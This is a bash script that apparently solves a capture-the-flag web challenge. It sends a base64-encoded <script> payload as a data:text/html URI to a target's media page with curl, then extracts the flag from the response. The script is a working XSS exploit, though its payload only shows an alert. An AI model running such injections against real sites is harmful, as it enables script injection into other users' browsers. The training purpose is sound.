#!/bin/bash
#
# ./get-the-xss-media-flag.sh "ip"
# 

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -svG --data-urlencode "${2}" "${1}" 
	return $?
}

theme="xss media base64 <script>alert('You have been Jinxed!')</script>"

echo -e "\n\033[35m13. === ${theme} ===============================================\033[0m\n"

text="<script>alert('You have been Jinxed!')</script>"
echo -e "We want to inject: \033[33m${text}\033[0m\nBut we need to encode it in base 64"
xss_text=`echo "${text}" | base64`
echo -e "After encoding it: \033[33m${xss_text}\033[0m\n"
flag=`simplified_curl_request "${1}/?page=media" "src=data:text/html;base64,${xss_text}" | grep -Eo "The flag is : [a-zA-Z0-9]*" | awk '{print $NF}'`
echo -e "Flag earned with xss data:base64 injection: \033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
